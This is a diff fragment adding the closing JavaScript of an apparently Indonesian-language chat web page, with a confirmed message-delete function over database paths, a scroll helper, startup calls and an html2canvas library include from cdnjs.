+window.deleteChat=async function(key){if(!confirm('Hapus?'))return;if(!lawan)return;try{await remove(ref(db,'chat/'+user+'_'+lawan+'/'+key))}catch(e){}try{await remove(ref(db,'chat/'+lawan+'_'+user+'/'+key))}catch(e){}};
+function scrollChat(){const c=document.getElementById('chatMsgs');c.scrollTop=c.scrollHeight}
+if(lawan){setTitle();loadChat()}
+addLog('System ready v2');
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</body>
+</html>
